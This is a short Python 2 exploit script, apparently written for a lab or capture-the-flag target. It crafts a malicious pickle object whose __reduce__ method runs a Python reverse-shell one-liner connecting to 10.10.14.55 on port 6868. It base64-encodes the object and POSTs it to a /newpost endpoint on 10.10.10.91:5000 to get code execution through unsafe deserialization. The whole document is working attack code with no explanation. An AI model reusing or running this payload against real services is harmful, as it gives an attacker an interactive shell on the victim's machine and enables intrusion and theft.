import pickle
import base64
import requests

# NOTE: Run as Python2. This is due to how pickle objects are encoded with the two version

##### PICKLE PAYLOAD #####

payload = "python -c 'import socket,subprocess,os;IP=\"10.10.14.55\";PORT=6868;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

class ReverseShell(object):
    def __reduce__(self):
        import os
        return (os.system, (payload,))

###########################

payload = base64.urlsafe_b64encode(pickle.dumps(ReverseShell()))

url = "http://10.10.10.91:5000/newpost"
response = requests.request("POST", url, data=payload)